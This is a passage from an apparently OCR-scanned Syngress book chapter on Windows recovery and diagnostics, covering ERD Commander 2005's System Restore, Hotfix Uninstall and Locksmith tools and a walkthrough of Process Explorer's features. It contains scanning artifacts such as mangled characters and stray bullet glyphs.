that it can find the restore points, you can click on the Next button to continue. 
There are three options on the Select Task screen (shown in Figure 1.26).You 
should approach the option of rolling back to an earlier version of Windows XP 
cautiously. Since the goal is to revert to a specific restore point, the first option is the 
logical choice. If you successfully ran this wizard once, and you realized that you may 
have reverted to the incorrect restore point, the second option would be available 
(the second and third options appear disabled in Figure 1.26 because this is the first 
time System Restore has been executed in this session). If this were the case, you 
would be able to undo the rollback and restore the build. Furthermore, you are per- 
www.syngress.com 

22 
Chapter 1 9 Recovering Your Computer with ERD Commander 
mitted only one system restore per session; you need to reboot for the rollback to 
take effect. If after reversing a system restore you realize you made a mistake by 
rolling back you will need to clear the undo cache--a record of the rollback activi- 
ties performed in this session~in order to attempt a restore to another point. 
Winternals designed this utility to permit you to roll back, undo the rollback, and 
undo the undo of the rollback so that you can roll back again. When you are sure 
that you are ready to continue, click the Next button. 
Figure 1.26 Selecting System Restore Options 
On the next screen, you can select the restore point to which you want to roll 
back. In the left pane on the screen in Figure 1.27, you can select the date when the 
restore point was created, and the list of available restore points for that date will be 
listed in the pane on the right. The navigational arrows in both panes can assist you 
in locating the correct month and date for the desired restore point. Click on the 
desired restore point in the pane on the right to highlight it and click the Next 
button to proceed. 

Recovering Your Computer with ERD Commander 9 Chapter 1 
23 
Figure 1.27 Finding and Selecting a Restore Point 
The Confirm Restore Point Selection screen is for information only, as demon- 
strated in Figure 1.28. A list will be displayed containing the files and Registry set- 
tings that will be deleted or modified.You may want to scroll through the list to 
ensure that everything is in order. When you are satisfied, click the Next button to 
begin the rollback to the selected restore point. 
Figure 1.28 Reviewing a Summary of the Changes That Will be Performed 

24 
Chapter 1 9 Recovering Your Computer with ERD Commander 
Once you click the Next button, the system restore process will begin. The file- 
names and Registry settings of the components that will be deleted or modified will 
be displayed as the process progresses to completion, as demonstrated in Figure 1.29. 
Figure 1.29 Executing the Restore Process 
When the restore process is complete, the Update Complete screen will appear 
(shown in Figure 1.30). The actual process "decouples" the affected files and 
Registry settings from the operating system. As a result, a reboot is required after the 
successful completion of the wizard for the changes to take effect. Click the Finish 
button to exit the wizard and initiate a reboot (select Start I Log Off" I Restart I 
OK, and remove the ER.D Commander 2005 Boot CD) into Windows normally. 
Figure 1.30 Completing the System Restore Wizard 

Recovering Your Computer with ERD Commander 9 Chapter 1 
25 
Removing Hotfixes 
So far, with ERD Commander 2005, we have reset lost or forgotten passwords and 
restored the stability of an otherwise unstable Windows XP system by rolling back 
to a restore point. These functions are two common solutions to the things that 
prevent, or at least degrade, the normal operation of your servers and workstations. 
In this section, we will look at another source of frustration for network adminis- 
trators--hotfixes that ended up causing more problems than they were supposed to 
solve--and the solution ERD Commander 2005 delivers to come to their assis- 
tance: Hotfix Uninstall. This is a wizard-driven utility used to uninstall (decouple 
and remove) individual or multiple hotfixes when the installation of a particular 
hotfix has rendered a system unbootable and you get to a point when Windows 
Add/Remove Programs--the conventional method of removing hotfixes~is out 
of reach. 
You should boot into ERD Commander 2005 using the process described ear- 
lier in this chapter. For Hotfix Uninstall to work, you must connect to a Windows 
partition because data is read from and written to the system Registry, and to the file 
system. After you launch the Hotfix Uninstall Wizard (select Start I System Tools 
I Hotfix Uninstall), the "Welcome..." screen appears with a description of the 
uninstallation process and warnings about when and how it should be used (see 
Figure 1.31). Click the Next button to proceed. 
Figure 1.31 Launching the Hotfix Uninstall Wizard in ERD Commander 2005 

26 
Chapter 1 9 Recovering Your Computer with ERD Commander 

Recovering Your Computer with ERD Commander 9 Chapter 1 
27 
The list of hotfixes that are available for uninstallation will be displayed on the 
subsequent screen, which is labeled "QFE Selection" and is displayed in Figure 1.32. 
You can click in the checkbox adjacent to each item in the list to select the 
offending hotfixes. Once you have finished making your selections, click on the 
Next button to continue. 
Figure 1.32 Selecting a Hotfix to Uninstall 

28 
Chapter 1 9 Recovering Your Computer with ERD Commander 
As mentioned earlier in this chapter, Hotfix Uninstall only decouples the hotfix 
from the operating system; it does not remove the hotfix from the system. On the 
Automatic Uninstall screen (shown in Figure 1.33), you can choose an option for 
removing the offending hotfix after the next normal boot into Windows. The 
default action is to "Run the uninstaller automatically when the system reboots." 
When a hotfix is identified for uninstallation in this wizard and the wizard com- 
pletes successfully, the window shown in Figure 1.35 will be displayed on a subse- 
quent reboot of the system into Windows prior to the creation of the Windows 
GUI, and the hotfix will be automatically removed. If you want to decouple the 
hotfix and then run Add/Remove Programs manually in Windows, you should 
choose the second option. Once you have selected your desired option, click the 
Next button to proceed. 
Figure 1.33 Choosing an Automatic Uninstallation Option 
That is all it takes. By the time the "Uninstall complete" message is displayed on 
the final screen, Hotfix Uninstall has made the required changes to the system 
Registry. Deleting and restoring the associated files will occur after the next reboot. 
Clicking the Finish button in the final stage of the wizard (Figure 1.34) will termi- 
nate the wizard and will return you to the ERD Commander 2005 desktop inter- 
face.You should now restart the system and boot normally into Windows for the 
changes to take effect. 

Recovering Your Computer with ERD Commander 9 Chapter 1 
29 
Figure 1.34 Exiting the Hotfix Uninstall Wizard 
As mentioned earlier in this section, the window in Figure 1.35 will be displayed 
the next time you boot normally into Windows before the fully appointed GUI is 
displayed. Click on the Next button to continue automatic removal of the hotfix. 
Figure 1.35 Starting the Automatic Hotfix Uninstallation Process in Windows 

30 
Chapter 1 9 Recovering Your Computer with ERD Commander 
Once you click the Next button, a window that shows the file restoration 
progress launches. The progress steps are displayed and the names of the hotfix files 
that are being deleted or copied back to their original locations in the file system are 
flashed in the window as they are processed, as demonstrated in Figure 1.36. 
Figure 1.36 Removing the Hotfix in Windows 
Once the restoration process is complete, the window will automatically disap- 
pear and Windows will continue to boot into your desktop environment. If you got 
to this step, Windows should now be bootable. If it is still unbootable, you can restart 
with the ERD Commander 2005 Boot CD and attempt to uninstall another hotfix, 
or search for a different source of the problem. 

Recovering Your Computer with ERD Commander 9 Chapter 1 
31 
Summary 
By now, you can see that ERD Commander 2005 is capable of bailing a Windows 
network administrator out of a number of very difficult, even disastrous, situations. 
Armed with the trusty boot disk, the administrator can access a number of the very 
best tools available for restoring a system that has been rendered inaccessible or 
unavailable. It all begins with creating the boot disk that is specific to your system 
hardware and to the recovery tasks you imagine you will need to perform. Once 
created, E1KD Commander presents the administrator with an interface that is 
familiar to any Windows user. If a panic situation, this reduces effort climbing the 
learning curve and reduces stress. 
The most common tasks will focus on resetting passwords (Locksmith) and 
rolling back whatever you did last to mess things up in Windows (System Restore 
and Hotfix Uninstall). In XP you can use the System Restore Point functionality. In 
other versions of Windows you can remove a hotfix to restore the system to a 
bootable state. While it may not be possible to restore it back to absolute system sta- 
bility, it will get you back into a Windows environment where you have the full 
range software tools to complete the job. 
Having said all of this, it is a powerful system that can be as easily used to cause 
damage as it is used for repair. When restoring a system, you need to possess elevated 
levels of access to get to components at the core of the operating system, such as the 
registry and file system settings. As much as possible, the boot disk should be pro- 
tected using passwords wherever available and in restricted distribution. Use E1KD 
Commander 2005 in good health. Here is hoping that you never have to use it. 
Solutions Fast Track 
Utilizing EI<D Commander 2005 
gl You use the ERD Commander 2005 Boot CD Wizard to create a boot 
CD that is tailored to the needs of your role, your organization, and your 
system requirements. 
The E1KD Commander 2005 desktop interface is familiar to Windows 
users and administrators. It provides a common look-and-feel, enables users 
to navigate networks and file systems, and delivers common tools (a text 
editor; network, file and Web browsers, a command shell) that have similar 
counterparts in Windows. 

32 
Chapter 1 9 Recovering Your Computer with ERD Commander 
EI There are two ways to access Winternals management and recovery utilities 
from the Start menu" the Program Groups (Administrative, Networking, 
and System Tools) and the Solution Wizard. 
Booting a Dead System 
gl 
gl 
If you configured the boot disk for dual-mode operation, you will have 
two boot options from which to choose: you can boot directly into the 
E1KD Commander 2005 desktop interface, or you can boot into the 
Remote Recover client software. 
If you are going to attempt to recover an inaccessible or unresponsive 
system, you will need to connect to a partition on the local hard disk 
where Windows is installed. 
Being the Locksmith 
Locksmith is a wizard-driven utility used to reset passwords for local user 
accounts. It is located at Start ] System Tools ] Locksmith. 
I-4I You can use Locksmith to reset the password for any local user account 
(not NT Domain or Active Directory), without needing to know the 
existing password. 
V~ You will need to reboot the system for the password change to take effect. 
Accessing Restore Points 
System Restore is a wizard-driven utility used to roll back a Windows XP 
installation to an established restore point. It is located at Start I System 
Tools I System Restore. 
You will need to reboot the system for the system restore to take effect. 


34 
Chapter 1 9 Recovering Your Computer with ERD Commander 
A: E1KD Commander 2005 has the Crash Analyzer (described in detail in Chapter 
7), which is a Wizard-driven utility developed specifically to analyze crash dump 
and system errors and help pinpoint the driver that is most likely causing the 
crash. Armed with this information, you can then use Hotfix Uninstall, System 
Restore (only if you are running Windows XP) and the Service or Driver 
Manger, among others, to reverse the condition that is causing the BSOD. 
Q: 
A: 
A colleague of mine .just won the lottery and has moved to Tahiti. I just inher- 
ited the servers for which he was responsible and he neglected to tell anyone 
before he got on the plane. What can I do? 
ERD Commander 2005 has a tool entitled Locksmith, which is a wizard-driven 
utility used to reset passwords for local user accounts.You will not be able to 
recover the passwords, but you will be able to create new ones, which happens 
to be a good practice when anyone on your position leaves the organization. 
Q 
I 
A: 
I reset the password for the Administrator account on my local server, and I still 
cannot access the files I need, even though I rebooted into ERD Commander 
2005 and am using the new password. What is going on? 
In all likelihood, you did not reboot normally into Windows after you reset the 
password.You need to boot into normally into Windows (i.e. boot completely 
into Windows, not into Safe Mode) in order for the system registry and other 
critical system files to be updated. Once you have done this, you can 


36 
Chapter 2 9 Examining Your Computer 
Introduction 
Process Explorer does everything the Task Manager does, and then some. While it 
retains most of the Task Manager's features, it adds so many bonus features that it 
could easily be a Task Manager replacement. In fact, Mark Russinovich added that capa- 
bility as an option in one of Process Explorer's recent updates. As of this writing, the 
current version of Process Explorer is v10.06. 
Exploring Process 
Activity with Process Explorer 
In this section, I will detail most of the functions and features available within 
Process Explorer. I will not touch on every single nuance available within the pro- 
gram, because that would be very time-consuming, and besides, Process Explorer 
comes with a highly detailed Help function that obviates the need for a detailed 
explanation here. 
Default Display Exp anation 
When you first open Process Explorer, you see a window divided into two sections, 
or panes (see Figure 2.1). 
Figure 2.1 The Process Explorer Main Program Display 

Examining Your Computer 9 Chapter 2 
37 
The Upper Pane 
The upper pane shows a process tree composed of all active processes and their chil- 
dren. A child is a process that is called during execution of its parent process. The 
same process can be a child to another process in the tree and the parent of a process 
that it calls during its own execution. The processes aligned along the leftmost 
border of the upper pane have no parents. The root of the process tree is the system 
idle process and all processes descend vertically from there. The children of a given 
process appear below the parent in an indented fashion. By default, the upper pane 
shows the processes from all users, but you can toggle this by selecting View i 
Show Processes from All Users on the menu. 
Figure 2.2 is a key to the color-coding scheme that Process Explorer uses.You 
can change the colors if you want, by clicking Options I Configure 
Highlighting, but I find the default choices to be very suitable. 
Figure 2.2 Process Explorer Color Highlighting Key 
The Lower Pane 
The lower pane is in dynamic link library (DLL) view by default. When you select a 
process in the upper pane by left-clicking it, it will be highlighted in a royal blue 
color and the bottom pane will list the DLLs used by that process. 
You can change the lower pane to show all handles open to a process instead of 
showing the DLLs associated with a process.You do this by selecting View ] Lower 
Pane View on the menu, or by toggling the View DLL toolbar button, which is the 

38 
Chapter 2 9 Examining Your Computer 
fourth button in from the right. Handles represent the operating resources open to a 
process. The operating system maintains a handle table of these resources or objects, 
and a handle is an index into that table. Some examples of handles that a process can 
use are files, directories, processes, threads, Registry keys, drives, events, tokens, 
WindowsStations (desktop Windows), and ports. If you are unsure about the 
meaning of a handle listed in the lower pane, you can double-click that specific item 
and view a Property box that provides a description of the handle. 
The Toolbar Buttons 
On my display, I cannot see all 10 available toolbar buttons by default.You may have 
to resize your CPU usage graph (discussed next) to expand the viewable area for 
your toolbar buttons. The 10 toolbar buttons represent shortcuts to various functions 
that you also can access in a less direct manner from the main menu (see Figure 2.3). 
Figure 2.3 The Process Explorer Toolbar Shortcuts 
I will discuss the remaining toolbar functions in the section "Process Explorer's 
Control Features" later in this chapter. 
The Mini-CPU Graph 
At the top of the upper pane, you can't miss the real-time CPU usage graph, called 
the Mini-CPU Graph. The vertical axis represents percentage of CPU activity and 
the horizontal axis represents time.You can hover your mouse cursor over peaks in 
the graph to examine the process responsible for CPU spikes to help you identify 
which process is consuming the majority of CPU cycles at any point in time. This is 
an ideal way to examine your system for overall resource consumption. The CPU 
activity always adds up to 100 percent, with the system idle process making up the 
difference. For example, in a system that is relatively inactive, the system idle process 
can consume 90 percent or more of the CPU cycles. Background programs such as 
the active protection and updating components of your antivirus or antispyware pro- 
grams normally consume the other 10 percent. 
If a process is consuming an inordinate number of CPU cycles, you may want to 
examine that process more closely.You can do this by targeting the responsible pro- 
cess in the process tree. Once you've located the process, simply right-click it, then 
select Properties I Performance Graph. 

Examining Your Computer 9 Chapter 2 
39 
The Performance Graph displays a real-time up-close view of CPU activity. It 
will show you whether a process has sustained activity or spiking. The graph uses a 
simple color-coding scheme: red represents CPU usage in kernel mode and green is 
the sum of both kernel-mode plus user-mode CPU activity. An application normally 
executes in user mode, but it will make system calls to perform kernel-level func- 
tions through the application program interface (API). Some kernel-level functions it 
may need are disk reads or writes, I/O access for printing, new file creations, and so 
forth. Application programs that employ kernel-mode drivers will show red activity 
when active. They will have services running, and they will be highlighted in pink in 
the process tree structure. 
The upper graph shows CPU activity and the lower bar graph indicates memory 
usage.You may have more than one property window open at once. This is conve- 
nient because if an application has more than one process running, you can examine 
the activity for each process simultaneously to assess the resource usage for a given 
program. 
Examining Process Resource Consumption 
In this section, I will use a practical example to illustrate a real-world application of 
the resource usage principles we just discussed. We will examine Process Explorer's 
real-time CPU graph to see whether it reveals anything worthy of investigation, 
while my system is relatively idle. We will assess my system to identify the processes 
or programs that run in the background and are high in resource consumption. 
Malware processes are notable for their exorbitant drain on system resources, but my 
aim here is do identify any "resource hogs," regardless of whether they are malware 
or benign applications. 
I have noticed from Process Explorer's CPU usage graph that the CounterSpy 
process called SunProtectionServer.exe is the biggest consumer of CPU cycles of the 
45 processes running on my system. I use Sunbelt's CounterSpy antispyware pro- 
gram, which I am very satisfied with and consider very effective. CounterSpy has 
both an on-demand scanner and a real-time protection component, which monitors 
a system in the background for threat activity. The real-time monitoring software is 
what is causing the CPU activity. Three CounterSpy processes run in the back- 
ground, but I will focus on only the active monitoring processes, 
SunProtectionServer.exe and SunThreatEngine.exe. 
I decide to zero in on the CPU activity by right-clicking SunProtectionServer. 
exe. I select Properties from the context menu, and then click Performance 
Graph.The graph shows that the CPU activity for SunProtectionServer.exe is very 
spiky, with fluctuating activity that creates a zigzag effect. The CPU usage of 
www.syngress.com 

40 
Chapter 2 9 Examining Your Computer 
SunProtectionServer.exe ranges between zero percent and 28 percent and its memory 
usage is an even 7.5 MB. 
What baffles me when I look at the figures is why the CounterSpy graph goes 
up and down so much. I decide to open another Properties window to check out 
the Performance Graph of the other CounterSpy background process, called 
SunThrea.tEngine.exe. I also want to see what is happening with that process in 
terms of resources. SunThreatEngine.exe consumes nearly no CPU activity, fluctu- 
ating between zero percent and 1 percent, but it consumes a great deal of memory, 
hovering around 50 MB of RAM on my system. Now I know that 
SunProtectionServer.exe consumes an inordinate number of CPU cycles, and 
SunThreatEngine.exe consumes a lot of RAM. 
I decide to return to researching the CPU activity of SunProtectionServer.exe, 
to try to assess the cause for its unusual spiking. I click on Performance in the 
Properties dialog so that I can inspect the raw performance data. The performance 
data displayed includes physical memory, virtual memory, and I/O and CPU statis- 
tics, which I examine to see whether I can narrow down the cause of the CPU 
spikes. Figure 2.4 shows both the Process Explorer performance data and the 
Performance Graph for the SunProtectionServer.exe process. 
Figure 2.4 SunProtectionServer.exe Performance Statistics 
The CPU spikes coincide with memory accesses that are generating a very large 
number of page faults. Normally, only a portion of a program is loaded into KAM 
(physical memory) and the rest of the program resides on disk in virtual memory. 

Examining Your Computer 9 Chapter 2 
41 
During program execution, a request for a valid address that is not in RAM triggers 
a page fault or interrupt, and control is transferred back to the operating system. The 
operating system then swaps the required page from virtual memory into RAM. 
Most of the CPU spikes coincide with a large number of page faults, as indicated by 
the Performance Window's Page Fault Delta figures. My conclusion, therefore, is that 
the operating system is expending a lot of overhead to swap virtual pages into and 
out of physical memory for the SunProtectionServer.exe process. The process is 
doing numerous memory reads of data that is not in RAM. This is causing the CPU 
to work extra-hard swapping pages in and out of memory, which is causing the 
CPU spikes. 
My overall assessment is that CounterSpy's active protection on my system con- 
sumes more than 55 MB of memory, which seems to be rather excessive by anyone's 
standards, and the CPU usage regularly spikes to around 25 percent, which is also 
rather excessive. Now, I have to decide whether I think CounterSpy is worth the 
resource trade-off, and I conclude that it is. First, CounterSpy has one of the best 
threat databases among antispyware programs and it has resisted caving in to ques- 
tionable companies that apply pressure to get their threats downgraded. Second, 55 
MB of memory, compared with the 1 GB of memory available to me, is not such a 
big deal, and I feel I can spare it. I could turn off CounterSpy's active protection and 
use it solely as an on-demand scanner, but I feel the trade-off is worth it, because I 
do not want to lose its superior protection capabilities. However, I am interested in 
pursuing the spiky CPU usage issue a bit more, mainly to verify two points: 
1. Whether this activity is similar to other active protection programs' 
resource usage 
2. Whether other users have documented or reported what I am seeing 
I examine my other active protection components for resource usage in the same 
way. Ewido Networks' ewido anti-malware uses 37.1 MB of memory, which repre- 
sents 70 percent of what CounterSpy uses. My antivirus software, ESET's NOD32, 
uses only 16.8 MB of memory, and Mischel Internet Security's THGuard and BillP 
Studios' WinPatrol both consume 5 MB of RAM, with no negligible CPU con- 
sumption. This confirms that CounterSpy is a standout in resource consumption 
when compared to my other active protection programs. 
I go back to the process tree and right-click SunProteetionServer.exe I 
Google to perform a Google search automatically on SunThreatEngine.exe. In the 
returned search results, I immediately see someone else has commented on its CPU 
usage: 

42 
Chapter 2 9 Examining Your Computer 
i have a question for you. When I log on to my client machine, 
which has the CounterSpy agent running on it, if I immediately 
bring up the Task Manager, the SunProtectionServer.exe process is 
running and taking up right around 50 percent of the CPU. No big 
deal; the machine is not too slow or bogged down. 
I also see that numerous other users are reporting experiences similar to mine in 
terms of resource usage. However, unlike the previous user, my research reveals that 
SunProtectionServer.exe consumes only half of what that user reported; either that, 
or his computer's available resources are half of mine. I suspect CounterSpy may have 
made substantial improvements to the program since users first reported these effects 
online. 
One CounterSpy beta tester explains his experience in response to other users' 
queries: 
After beta testing this product from the time that it was in pre- 
beta until its release yesterday, all l can say is that l really don't 
understand how it works. ! did the majority of testing on a 
Windows XP box with a 1GHz Pentium III and 768 MB of RAM. All 
the way through I was concerned about the high resource usage as 
I watched in Process Explorer, although it never seemed to affect 
my system. I was especially concerned about the advertised min- 
imum system specs and didn't see how they could possibly support 
an app using resources of this magnitude. 
A couple of weeks ago, I rescued a pristine HP Pavilion from the 
curbside trash pickup that had a 566MHz Celeron, 64MB of RAM, 
and Windows 98 SE. This is about as close as I am going to get to 
the CounterSpy minimums, so i decided to test it for myself. I 
installed CounterSpy 1.5.70 beta after installing the Sygate per- 
sonal firewall and AVG antivirus software. All active protection 
monitors were enabled and I was able to do network file transfers 
and general browsing, even while conducting scans. Since that 
time, I have upgraded first to 1.5.73 beta and yesterday to 1.5.77. I 
am certainly not going to claim that the system runs well, but look 
at the RAM. I was actually surprised that it even installed, let alone 
ran reasonably well. The real surprise was that CounterSpy seemed 
to use less of the CPU on the 98 SE system than on the XP system. 

Examining Your Computer 9 Chapter 2 
43 
I have watched this thing for months now using Process Explorer, 
and I am still confused. It will start out after a scan with high RAM 
usage, which decreases over time. CPU usage will spike high but 
then spike lower when other apps are running. I have run simulta- 
neous scans with both CounterSpy and AdAware without any 
appreciable effect on scan times. At this time, the only conclusion 
that l can come to is that CounterSpy will use any available 
resources but doesn't necessarily demand them. That almost 
sounds lame to me, but it is the best way that I can explain it now. 
I decided to put the beta tester's theory to the test by running Process Explorer, 
Autoruns, SpyBot Search & Destroy, ewido, and NOD32 scans simultaneously. My 
system was virtually operating at 100 percent CPU capacity, as you can see by 
inspecting the system CPU activity in the Mini-CPU Graph at the top of Figure 2.5 
and Figure 2.6. 
As you can see, initially there was no decrease in the consumption of CPU usage 
by SunProtectionServer.exe (see Figure 2.5).You can see that the system CPU usage 
is at full capacity in the upper graph. However, after a small amount of time passed, I 
did notice a decline in SunProtectionServer.exe's resource consumption, as depicted 
in Figure 2.6. Its CPU activity was essentially cut in half when compared to the 
cycles it gobbled up on an idle system. Once I aborted all the scanners, however, it 
regained its former CPU cycle appetite. That did not cause me concern, because I 
saw that SunProtectionServer.exe's CPU consumption did adjust when I placed 
other demands on my computer's CPU. Whether it was Windows or the process 
itself that made this adjustment is not clear. Figure 2.5 shows 
SunProtectionServer.exe's CPU consumption when my system was initially sub- 
jected to maximum CPU capacity. 
After a slight time delay, SunProtectionServer.exe's CPU usage dropped to less 
than half of what it was when my system was idle (see Figure 2.6). 
www.syngress.com 

44 
Chapter 2 9 Examining Your Computer 
Figure 2.5 SunProtectionServer.exe's Initial CPU Usage When System CPU 
Usage Was at a Maximum 
Figure 2.6 SunProtectionServer.exe's Delayed CPU Usage* 
* System CPU usage was at a maximum. 

Examining Your Computer 9 Chapter 2 
45 
Something caused redistribution of system resources, so the beta tester's theory 
surprisingly panned out. 
To me, the bottom line is that if I can afford the resource trade-off for the protec- 
tion that CounterSpy affords me, I should keep it active. It is not causing any notice- 
able performance issues, and as the beta tester commented, its CPU usage seems to 
self-adjust according to the other demands placed on the system. I decide to accept 
CounterSpy's flaws in favor of retaining an excellent antispyware program, since very 
few programs approach perfection anyway. Besides, if I want to reclaim some of the 
resources it is using, I can always use CounterSpy as an on-demand scanner. 
Now, let's go over Process Explorer's control functions. 
Viewing and Controlling Process 
Activity Using Process Explorer 
Viewing, stopping, and starting processes and services using Process Explorer is both 
convenient and easy. Process Explorer provides access to these important process 
control functions in two places: the main menu and the context menu of a high- 
lighted process. Process Explorer provides two additional process control features that 
are not available in the Task Manager~namely, Suspend and Resume. Process 
Explorer is unique in that it provides service control features that you can access by 
selecting the Services tab in the Properties dialog.You can stop, pause, and resume 
services from the Properties dialog. The Properties dialog even provides an option, 
called Threads, which lets you kill the individual units comprising a running process. 
This is important from a malware perspective, because malware DLLs can inject 
threads into a legitimate running process to ensure their execution. We will now 
review all of these Process Explorer control features, and many others, in detail. 
Process Explorer's Control Features 
Process Explorer provides eight menu bar functions: File, Options, View, Process, 
Find, Handle, Users, and Help. Process Explorer comes with a very thorough Help 
file, so I will not go into an in-depth explanation of all the controls. Experimenting 
with the program itself is the best way to become familiar with all of Process 
Explorer's control features. 

46 
Chapter 2 9 Examining Your Computer 
File 
The File function offers the same features that the Task Manager offers and a few 
new features as well. Many of the functions offered enable you to operate your com- 
puter if Explorer is not operational, which means no graphical interface is available 
(no desktop icons or taskbar is available). File's features include the following: 
9 
Shutdown Provides typical functions to restart and shut down your com- 
puter. 
9 
Run Provides run-line access to execute programs, but you must supply 
the image path. 
Process Explorer includes the following features not found in the Task Manager: 
9 
Run as Launches a program through another user account. 
9 
Run as Limited User A security feature that allows you to launch a pro- 
gram with limited user privileges, even if you are signed on as an adminis- 
trative user.You can use this feature to launch Internet Explorer so that you 
can surf more safely. 
9 
Exit Closes Process Explorer. 
9 
Save Saves the process information in both the upper and lower panes to a 
text file (log) within the Process Explorer folder. 
9 
Save As Allows you to specify the name and location of the log file you 
are saving. 
Options 
The Options function allows you to change preferences and default settings for 
Process Explorer to suit your individual tastes. The Options function includes the 
following features: 
9 
Default Search Engine Specifies the default search engine to be used 
for searches on processes performed via the context menu or Properties 
dialog box.You also can use it to search for DLLs or handles selected in the 
bottom pane. The default is Google. 
9 
Replace Task Manager Allows Process Explorer to be substituted for the 
Task Manager. 
www.syngress.com 

Examining Your Computer 9 Chapter 2 
47 
Confirm Kill 
process. 
By default, you are prompted to confirm before killing a 
System Information Opens a window that displays global resource usage 
statistics and an enlarged CPU graph for all active processes within the 
system. This is analogous to the data that would be displayed for an indi- 
vidual process if the Performance and Performance Graph windows were 
combined. 
View Offers various options for customizing the default display which 
have already been discussed. 
View 
The View functions allow you to control what you see in Process Explorer's display. 
I will describe the settings that are used in Process Explorer's Default Display, since 
they are configured to highlight Process Explorer's main features. The Process 
Explorer default display is configured with the following settings: The upper pane 
shows the process tree and the lower pane shows the DLL view, as opposed to the 
Handle view. The default color scheme is that which is displayed in the color key. 
The Handle View can be toggled on, by clicking View ] Lower Pane View [ 
Handles on the Process Explorer menu. 
The upper pane shows the active processes for all the users on the system. It 
shows these processes in a tree structure. 
The Process Color Key explains the status of the processes running on the 
system. Here's what the colors in the key signify: 
9 Pink Processes which have running services. 
9 Lavender Processes with no running services. 
9 Purple Packed images. 
9 Royal Blue Selected process for lower pane data display. 
The lower pane shows the DLLs for the process that is selected in the upper 
pane (as opposed to the handles for that process). This is the lower pane view. 
The Handle View shows operating system resources that the process selected in 
the upper pane is using. To toggle to the lower pane view (DLL versus handle), use 
the toolbar button assigned to that function, or select View [ Lower Pane View. 

48 
Chapter 2 9 Examining Your Computer 
Process 
The Process function allows you to inspect and control process activity. It offers sev- 
eral options that allow you to kill, restart, or set the priority of a process. For 
instance, the Kill Process Tree option will kill a process and all of its descendents. 
Suspend and Resume allow you to pause a process and then resume it from the 
point it was stopped. This may come in handy if you need to free a system resource 
(handle) that another process is using. We will illustrate the practical use of the 
Suspend function in one of our later examples. Selecting Properties opens a 
Properties dialog window for the process, highlighted in the upper pane. Selecting 
the Google option will launch an Internet search on the highlighted process using 
Google. MSN Search will be displayed if the default search engine was changed 
using Options [ Search Engine [ MSN Search. Process accesses the same func- 
tions which are available in the Context menu or the Properties dialog of the 
selected process. 
Find 
The Find function allows you to search on a handle or DLL to see what processes 
have a particular resource open or DLL loaded. This comes in handy when you are 
trying to troubleshoot "access denied" or "file in use" errors. These errors are rela- 
tively common when trying to delete infected files. Process Explorer can help you 
kill the malware processes that have a hold on these files. 
DLL/Handle 
Depending on the settings, the lower pane will be in DLL or Handle view. As, 
noted previously, by default, the lower pane is in the DLL view. The Properties dis- 
cussed below, display information on the DLL or Handle, highlighted in the lower 
pane.You also can access these options via the context menu by right-clicking the 
DLL or Handle displayed in the lower pane. The Context menu of a DLL allows 
you to conduct a search on the highlighted item by selecting Google. The Context 
menu of a handle allows you the option of closing the highlighted handle. I will 
now discuss the functions available in the DLL and Handle Properties dialogs. 
The DLL Properties dialog for a selected DLL shows the image or location of 
a file on disk and information about the DLL, such as whether it has a digitally veri- 
fied or unverified signature, whether it is unsigned, and the company name associ- 
ated with it. If you select the Verify button, it will try to verify the signature 
digitally, over the Internet. Selecting Strings will show the printable strings within 
the image file.You can save the string results or conduct a search for a search term 

Examining Your Computer 9 Chapter 2 
49 
within the string's text by selecting Google. Process Explorer uses a heuristic algo- 
rithm to judge whether a file is in packed form. If it determines that this is likely, it 
places a label above the full path display field that states that the "Image is probably 
packed". Packing is a technique that malware can use to prevent it from being 
scanned by security programs. Because of this, you should investigate packed image 
processes of unknown origin. 
The Handle Properties dialog contains a Details tab which shows the name, 
type, description, and address of the handle. 
It also shows how many references 
there were to the handle. The Security tab displays security permissions informa- 
tion about the handle and enables you to modify its security settings. 
Users 
The Users menu displays a list of users who are logged on to the computer 
remotely, using Terminal Services. A menu entry for each session includes the session 
ID and the user. By clicking on an active session menu entry, you can disconnect, 
log off, or send a message to the user. When you select Properties for a given ses- 
sion, information will be displayed about the session, including the client's Internet 
Protocol (IP) address and name. The user information is updated to reflect the cur- 
rent state each time the Users menu is opened. 
Help 
The Help menu provides access to Process Explorer's extensive Help database, which 
can provide more detail on any of the features discussed here. Help is provided in 
table of contents, index, and search forms. 
Viewing Process Information 
and Controlling Process Activity 
The identical process control features are accessed through the Process function on 
the Menu and the Context menu of a selected process. The process Properties 
Dialog for a selected process, allows you to kill a process and also enables you to 
view a vast amount of identifying information about that process. It even enables 
you to control process thread activity. 
The Process Context Menu 
The Process Context menu allows you to perform operations on the process that is 
selected in the upper pane by simply right-clicking the process. I have already dis- 
cussed most of the available functions. These same process functions are available on 

50 
Chapter 2 9 Examining Your Computer 
the menu bar by clicking Process.You can perform four process control operations via 
the context menu: Kill Process, Kill Process Tree, Suspend Process, and Restart Process. 
Properties 
Selecting Properties opens a Property dialog that shows you more information about 
the selected process. The features of the Properties dialog are discussed separately 
below. 
Google/MSN Search 
Google/MSN Search queries the default search engine for information on a process. 
The Process Properties Dialog 
The Process Properties dialog gives you the opportunity to view many attributes 
associated with a specific process. It also allows you to perform operations on process 
components, such as associated services and threads, and it gives you an enormous 
amount of information associated with a process. 
You can access the Process Properties dialog by double-clicking or right-clicking 
a process in the process tree. The Process Properties dialog provides detailed informa- 
tion about a process. The Process Name: Numerical PID (Process ID) is displayed at 
the top of the dialog, and selectable tabs~Image, Performance, Performance Graph, 
Threads, TCP/IP, Security, Services, Environment, and Strings~will display addi- 
tional information about a process. 
Figure 2.7 shows a sample Process Properties dialog box for the LiveUpdate.exe 
process. 
Figure 2.7 Process Properties for LiveUpdate.exe 

Examining Your Computer 9 Chapter 2 
51 
You can access the following functions, which are relevant to our discussion in 
this chapter, from within the Process Properties dialog: 
9 Image Reveals the following information about the selected process: full 
path, launch command, parent process, user account under which it's run- 
ning, and whether the image signature has been digitally verified. Because 
verification takes time, it is turned off by default, but clicking the Verify 
button will initiate verification on the selected process. 
9 
Performance Shows memory and CPU usage statistics for the selected 
process. 
9 Performance Graph Displays a graphical representation of performance 
data. 
9 Threads Shows the individual threads that execute within a process and 
provides buttons to kill and suspend process threads. 
9 
TCP/IP Displays any TCP and UDP endpoints that are active and owned 
by the current process. 
9 
Security Displays the security token information for a process. 
9 
Services Displays the Win32 services that are running under the selected 
process, and provides buttons to suspend, stop, and start the selected service. 
9 Environment Shows the environment variables associated with a process. 
9 
Strings Displays all strings (readable text) associated with a process. Strings 
can provide clues about the nature of a process and can sometimes reveal 
vendor/developer tracing information. 
The Shortcut Toolbar 
The Shortcut toolbar provides easy access to commonly used Process Explorer func- 
